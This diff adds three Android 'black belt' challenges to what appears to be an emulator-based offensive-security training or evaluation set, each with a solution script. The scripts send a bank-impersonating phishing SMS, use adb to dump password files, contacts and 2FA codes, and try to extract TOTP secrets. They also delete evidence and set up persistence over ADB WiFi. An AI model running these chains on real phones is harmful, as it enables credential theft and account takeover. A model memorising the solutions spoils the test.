@@ -392,3 +392,472 @@ challenges:
   - cve-2017-8270
   - cwe-362
   - cwe-416
+
+# =============================================================================
+# SOCIAL ENGINEERING SIMULATION CHALLENGE
+# =============================================================================
+# Complete attack scenario with phishing, user simulation, and credential theft
+
+- id: black_social_001
+  name: "Full Chain: Social Engineering to Data Exfiltration"
+  description: |
+    ULTIMATE SOCIAL ENGINEERING CHALLENGE: Execute a complete attack from
+    initial phishing contact through full data exfiltration with proof.
+
+    SCENARIO: Execute a realistic attack chain against the device persona:
+    1. Send convincing phishing SMS mimicking a trusted entity
+    2. Simulate user clicking the malicious link
+    3. Deploy payload for credential/data capture
+    4. Exfiltrate high-value data with proof
+    5. Clean up evidence
+
+    PHASE 1 - RECONNAISSANCE (Use Earlier Belt Skills):
+    - Review contact list for trusted entities (Mom, Boss, Bank)
+    - Analyze existing SMS patterns for mimicry
+    - Identify highest-value targets on device
+
+    PHASE 2 - SOCIAL ENGINEERING:
+    - Craft phishing SMS that mimics trusted source (Chase, Google)
+    - Create urgency (security alert, account locked)
+    - Send via ADB emulator SMS injection
+
+    PHASE 3 - USER INTERACTION SIMULATION:
+    - Simulate user tapping notification (input tap)
+    - Simulate opening malicious link
+    - Simulate credential entry if prompted
+
+    PHASE 4 - DATA EXFILTRATION:
+    - Extract banking credentials (if hooks active)
+    - Extract passwords.txt content
+    - Extract 2FA codes from SMS
+    - Extract sensitive files
+
+    PHASE 5 - VERIFICATION & CLEANUP:
+    - Output ALL exfiltrated data as proof
+    - Delete phishing SMS from device
+    - Log attack timeline
+
+    SUCCESS CRITERIA:
+    - Phishing SMS sent and "clicked"
+    - At least 3 categories of sensitive data exfiltrated
+    - Proof of each exfiltration printed
+    - Attack completed in < 5 minutes
+  belt: black
+  difficulty: 5
+  script_type: multi
+  compatibility: universal
+
+  persona_requirements:
+    required_apps:
+      - com.whatsapp
+      - com.chase.sig.android
+    min_contacts: 50
+    min_sms: 100
+    required_files:
+      - /sdcard/Documents/passwords.txt
+
+  inputs:
+    device_id: emulator-5554
+    device_context:
+      task: full_social_engineering_chain
+      attack_phases:
+        - reconnaissance
+        - social_engineering
+        - user_simulation
+        - data_exfiltration
+        - verification
+
+  validation:
+    type: multi_check
+    checks:
+      - type: output_contains
+        expected: "EXFILTRATED"
+      - type: output_contains
+        expected: "password"
+
+  hints:
+    - "Use 'adb emu sms send <number> <message>' for SMS injection"
+    - "Study persona SMS history for convincing message patterns"
+    - "Use 'adb shell input tap X Y' to simulate user taps"
+    - "The passwords.txt file is low-hanging fruit - grab it first"
+    - "2FA codes in SMS are time-sensitive but valuable"
+    - "Delete evidence with 'content delete --uri content://sms'"
+
+  kata_solution: |
+    # PHASE 1: Reconnaissance
+    echo "=== PHASE 1: RECONNAISSANCE ==="
+    adb shell content query --uri content://contacts/phones --projection display_name:number | head -20
+    adb shell content query --uri content://sms --projection address:body | head -10
+
+    # PHASE 2: Social Engineering
+    echo "=== PHASE 2: SOCIAL ENGINEERING ==="
+    adb emu sms send "1-800-935-9935" "Chase Alert: Unusual sign-in detected. Verify your identity: http://chase-verify.com/secure"
+
+    # PHASE 3: User Simulation
+    echo "=== PHASE 3: USER SIMULATION ==="
+    sleep 2
+    adb shell input tap 540 1200  # Tap notification
+
+    # PHASE 4: Data Exfiltration
+    echo "=== PHASE 4: DATA EXFILTRATION ==="
+    echo "[EXFILTRATED] Passwords file:"
+    adb shell cat /sdcard/Documents/passwords.txt
+
+    echo "[EXFILTRATED] Recent 2FA SMS:"
+    adb shell content query --uri content://sms --where "body LIKE '%code%' OR body LIKE '%verification%'"
+
+    echo "[EXFILTRATED] Contact list:"
+    adb shell content query --uri content://contacts/phones | head -50
+
+    # PHASE 5: Cleanup
+    echo "=== PHASE 5: CLEANUP ==="
+    adb shell content delete --uri content://sms --where "body LIKE '%chase-verify%'"
+    echo "[COMPLETE] Evidence removed"
+
+  scoring:
+    reconnaissance: 10
+    social_engineering: 20
+    user_simulation: 20
+    data_exfiltration: 40
+    cleanup: 10
+
+  tags:
+    - social-engineering
+    - full-chain
+    - capstone
+    - persona-required
+    - simulation
+
+# =============================================================================
+# INTELLIGENCE-BASED EXPLOITATION CHALLENGE
+# =============================================================================
+# Uses information gathered from previous challenges to complete complex tasks
+
+- id: black_intel_001
+  name: "Intelligence Synthesis: Targeted Account Takeover"
+  description: |
+    BLACK BELT INTELLIGENCE CHALLENGE: Use previously gathered intelligence
+    to execute a complete account takeover with proof.
+
+    PREREQUISITE: This challenge assumes you have completed:
+    - Orange Belt: Contact/SMS/File exfiltration
+    - Green Belt: App hooking and credential interception
+    - Earlier Black Belt reconnaissance
+
+    SCENARIO: Using all intelligence gathered from previous challenges,
+    execute a targeted attack against the user's primary banking account.
+
+    INTELLIGENCE SOURCES TO UTILIZE:
+    - Contacts: Bank support numbers, VIP contacts
+    - SMS History: Recent banking alerts, 2FA patterns
+    - Files: passwords.txt, any credential backups
+    - Browser: Banking session cookies
+    - Clipboard: Recent sensitive copies
+
+    PHASE 1 - INTELLIGENCE CORRELATION:
+    - Cross-reference all gathered data
+    - Identify banking credentials from multiple sources
+    - Map 2FA backup methods (SMS, email, authenticator)
+
+    PHASE 2 - CREDENTIAL ASSEMBLY:
+    - Extract username (often email) from:
+      * Browser history/cookies
+      * passwords.txt
+      * Contact email fields
+    - Extract password from:
+      * passwords.txt
+      * Previous Frida credential hooks
+      * Clipboard history
+
+    PHASE 3 - 2FA BYPASS PREPARATION:
+    - Identify 2FA method from SMS patterns
+    - Set up real-time SMS interception
+    - OR extract TOTP secrets from authenticator
+
+    PHASE 4 - ACCOUNT ACCESS PROOF:
+    - Demonstrate you have:
+      * Valid credentials (username + password)
+      * 2FA bypass capability
+      * Session persistence method
+    - Output all gathered intelligence as proof
+
+    SUCCESS CRITERIA:
+    - Credentials extracted from multiple sources
+    - 2FA bypass method identified
+    - Complete attack package assembled
+    - All evidence documented with sources
+  belt: black
+  difficulty: 5
+  script_type: multi
+  compatibility: universal
+
+  persona_requirements:
+    required_apps:
+      - com.chase.sig.android
+      - com.google.android.apps.authenticator2
+    min_sms: 100
+    required_files:
+      - /sdcard/Documents/passwords.txt
+
+  inputs:
+    device_id: emulator-5554
+    device_context:
+      task: intelligence_synthesis
+      goal: account_takeover
+      target: "Chase Banking Account"
+      intelligence_sources:
+        - contacts
+        - sms_history
+        - files
+        - browser
+        - clipboard
+        - frida_hooks
+
+  validation:
+    type: multi_check
+    checks:
+      - type: output_contains
+        expected: "CREDENTIAL"
+      - type: output_contains
+        expected: "2FA"
+      - type: output_contains
+        expected: "SOURCE:"
+
+  hints:
+    - "The passwords.txt file has Chase credentials - extract them first"
+    - "Cross-reference with browser history for username confirmation"
+    - "SMS 2FA codes have a pattern - identify the sender number"
+    - "Google Authenticator stores TOTP secrets in SQLite"
+    - "Document each piece of intelligence with its source"
+
+  kata_solution: |
+    echo "===== INTELLIGENCE SYNTHESIS REPORT ====="
+    echo ""
+
+    # Extract credentials from passwords file
+    echo "=== CREDENTIAL EXTRACTION ==="
+    echo "[SOURCE: /sdcard/Documents/passwords.txt]"
+    CREDS=$(adb shell cat /sdcard/Documents/passwords.txt | grep -i chase)
+    echo "CREDENTIAL: $CREDS"
+
+    # Cross-reference with browser history
+    echo ""
+    echo "[SOURCE: Browser History]"
+    adb shell content query --uri content://browser/bookmarks --where "url LIKE '%chase%'"
+
+    # Extract 2FA patterns
+    echo ""
+    echo "=== 2FA ANALYSIS ==="
+    echo "[SOURCE: SMS History]"
+    adb shell content query --uri content://sms --where "address LIKE '%chase%' OR body LIKE '%verification%'"
+
+    # Check for authenticator TOTP
+    echo ""
+    echo "[SOURCE: Authenticator Database]"
+    adb shell "run-as com.google.android.apps.authenticator2 cat databases/databases 2>/dev/null || echo 'Direct access denied - use Frida'"
+
+    # Clipboard analysis
+    echo ""
+    echo "=== CLIPBOARD INTELLIGENCE ==="
+    echo "[SOURCE: System Clipboard]"
+    # Clipboard requires Frida or accessibility service
+
+    # Final intelligence package
+    echo ""
+    echo "===== ATTACK PACKAGE ASSEMBLED ====="
+    echo "TARGET: Chase Banking"
+    echo "USERNAME: [extracted from passwords.txt]"
+    echo "PASSWORD: [extracted from passwords.txt]"
+    echo "2FA METHOD: SMS to $(adb shell content query --uri content://sms --where "body LIKE '%Chase%'" --projection address | head -1)"
+    echo "2FA BYPASS: Real-time SMS interception active"
+    echo ""
+    echo "[INTELLIGENCE SYNTHESIS COMPLETE]"
+
+  scoring:
+    credential_extraction: 30
+    intelligence_correlation: 25
+    two_factor_analysis: 25
+    documentation: 20
+
+  tags:
+    - intelligence
+    - account-takeover
+    - synthesis
+    - persona-required
+    - capstone
+
+- id: black_intel_002
+  name: "Attack Chain: From Information to Exploitation"
+  description: |
+    BLACK BELT MASTERY CHALLENGE: Demonstrate complete attack chain
+    using information progressively gathered across belt levels.
+
+    This challenge tests your ability to:
+    1. Gather information systematically (White-Yellow)
+    2. Exfiltrate useful data (Orange)
+    3. Hook and monitor applications (Green)
+    4. Exploit vulnerabilities (Blue)
+    5. Synthesize and execute (Black)
+
+    OBJECTIVE: Achieve persistent access to the device AND prove
+    you can access the user's most sensitive data categories:
+    - Financial (banking credentials, crypto keys)
+    - Communications (messages, emails)
+    - Authentication (passwords, 2FA)
+    - Personal (contacts, location history)
+
+    PHASES:
+
+    1. ENUMERATION (Prove device knowledge):
+       - Output device fingerprint
+       - List all installed sensitive apps
+       - Identify security posture
+
+    2. DATA ACCESS (Prove data access):
+       - Extract at least 5 contacts
+       - Extract at least 5 SMS messages
+       - Extract password file content
+
+    3. APP INTELLIGENCE (Prove app knowledge):
+       - Identify running apps
+       - Find hookable authentication points
+       - Document app data directories
+
+    4. SENSITIVE DATA (Prove high-value access):
+       - Banking: credentials or transaction history
+       - Crypto: wallet info or keys
+       - Auth: 2FA codes or TOTP secrets
+
+    5. PERSISTENCE (Prove lasting access):
+       - Demonstrate method for re-gaining access
+       - Document persistence mechanism
+
+    SUCCESS CRITERIA: Each phase must output documented proof
+  belt: black
+  difficulty: 5
+  script_type: multi
+  compatibility: universal
+
+  persona_requirements:
+    min_contacts: 50
+    min_sms: 100
+    min_apps: 15
+    required_files:
+      - /sdcard/Documents/passwords.txt
+
+  inputs:
+    device_id: emulator-5554
+    device_context:
+      task: complete_attack_chain
+      phases:
+        - enumeration
+        - data_access
+        - app_intelligence
+        - sensitive_data
+        - persistence
+
+  validation:
+    type: multi_check
+    checks:
+      - type: output_contains
+        expected: "PHASE 1 COMPLETE"
+      - type: output_contains
+        expected: "PHASE 2 COMPLETE"
+      - type: output_contains
+        expected: "PHASE 3 COMPLETE"
+      - type: output_contains
+        expected: "PHASE 4 COMPLETE"
+      - type: output_contains
+        expected: "PHASE 5 COMPLETE"
+
+  hints:
+    - "Structure your output clearly by phase"
+    - "Each phase builds on previous - save useful information"
+    - "For persistence, consider: Frida gadget, accessibility service, or scheduled tasks"
+    - "Document everything - this is an intelligence operation"
+
+  kata_solution: |
+    echo "╔═══════════════════════════════════════════════════════════════╗"
+    echo "║           BLACK BELT: COMPLETE ATTACK CHAIN                   ║"
+    echo "╚═══════════════════════════════════════════════════════════════╝"
+
+    echo ""
+    echo "═══════════════════════════════════════════════════════════════"
+    echo "PHASE 1: ENUMERATION"
+    echo "═══════════════════════════════════════════════════════════════"
+    echo "[*] Device Fingerprint:"
+    adb shell getprop ro.build.fingerprint
+    echo "[*] Android Version: $(adb shell getprop ro.build.version.release)"
+    echo "[*] Security Patch: $(adb shell getprop ro.build.version.security_patch)"
+    echo "[*] Sensitive Apps Installed:"
+    adb shell pm list packages | grep -E "(bank|chase|venmo|whatsapp|authenticator|coinbase|password)" | head -10
+    echo "[PHASE 1 COMPLETE]"
+
+    echo ""
+    echo "═══════════════════════════════════════════════════════════════"
+    echo "PHASE 2: DATA ACCESS"
+    echo "═══════════════════════════════════════════════════════════════"
+    echo "[*] Contact Sample (5 entries):"
+    adb shell content query --uri content://contacts/phones --projection display_name:number | head -5
+    echo "[*] SMS Sample (5 entries):"
+    adb shell content query --uri content://sms --projection address:body | head -5
+    echo "[*] Password File:"
+    adb shell cat /sdcard/Documents/passwords.txt
+    echo "[PHASE 2 COMPLETE]"
+
+    echo ""
+    echo "═══════════════════════════════════════════════════════════════"
+    echo "PHASE 3: APP INTELLIGENCE"
+    echo "═══════════════════════════════════════════════════════════════"
+    echo "[*] Running Processes:"
+    adb shell ps -A | grep -E "(chase|whatsapp|coinbase)" | head -5
+    echo "[*] Banking App Data Directory:"
+    adb shell ls -la /data/data/com.chase.sig.android/ 2>/dev/null || echo "Access denied (expected without root)"
+    echo "[*] Hookable Entry Points:"
+    echo "    - com.chase.sig.android/.LoginActivity"
+    echo "    - com.whatsapp/.Main"
+    echo "[PHASE 3 COMPLETE]"
+
+    echo ""
+    echo "═══════════════════════════════════════════════════════════════"
+    echo "PHASE 4: SENSITIVE DATA"
+    echo "═══════════════════════════════════════════════════════════════"
+    echo "[*] Banking Credentials (from passwords.txt):"
+    adb shell cat /sdcard/Documents/passwords.txt | grep -i chase
+    echo "[*] 2FA SMS Codes:"
+    adb shell content query --uri content://sms --where "body LIKE '%code%' OR body LIKE '%verification%'" --projection body | head -3
+    echo "[*] Crypto Wallet Info:"
+    adb shell cat /sdcard/Download/Crypto_Wallet_Backup.pdf 2>/dev/null || echo "File requires different path or root"
+    echo "[PHASE 4 COMPLETE]"
+
+    echo ""
+    echo "═══════════════════════════════════════════════════════════════"
+    echo "PHASE 5: PERSISTENCE"
+    echo "═══════════════════════════════════════════════════════════════"
+    echo "[*] Persistence Method: ADB over WiFi"
+    echo "    - Enable: adb tcpip 5555"
+    echo "    - Connect: adb connect <device_ip>:5555"
+    echo "[*] Alternative: Frida Gadget injection into target app"
+    echo "[*] Alternative: Accessibility service with persistent notification listener"
+    echo "[*] Verification:"
+    adb shell getprop service.adb.tcp.port || echo "TCP ADB not enabled yet"
+    echo "[PHASE 5 COMPLETE]"
+
+    echo ""
+    echo "╔═══════════════════════════════════════════════════════════════╗"
+    echo "║              ATTACK CHAIN COMPLETED SUCCESSFULLY              ║"
+    echo "╚═══════════════════════════════════════════════════════════════╝"
+
+  scoring:
+    enumeration: 15
+    data_access: 20
+    app_intelligence: 20
+    sensitive_data: 30
+    persistence: 15
+
+  tags:
+    - full-chain
+    - intelligence
+    - capstone
+    - persona-required
+    - mastery
